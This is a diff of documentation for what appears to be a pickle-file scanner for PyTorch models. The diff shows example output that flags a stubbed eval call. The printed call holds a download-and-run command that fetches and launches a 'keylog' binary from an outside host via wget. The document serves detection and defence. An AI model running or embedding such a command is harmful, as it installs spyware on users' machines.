@@ -109,17 +109,17 @@ for c in result.classes:
 > torch._utils._rebuild_tensor_v2
 > torch.FloatStorage
 ...
-> STUBBED exec
+> STUBBED __builtin__.eval
 > collections.OrderedDict
 ...
 ```
 ```py
 for c in results.calls:
-    if 'exec' in c:
+    if 'eval' in c:
         print(c)
 ```
 ```py
-> exec('import os;os.system("wget https://sus.to/keylog;chmod +x keylog;./keylog &")')
+> __builtin__.eval('import os;os.system("wget https://sus.to/keylog;chmod +x keylog;./keylog &")')
 ```
 ## Blacklist & Whitelist
 The whitelist has priority over the blacklist.
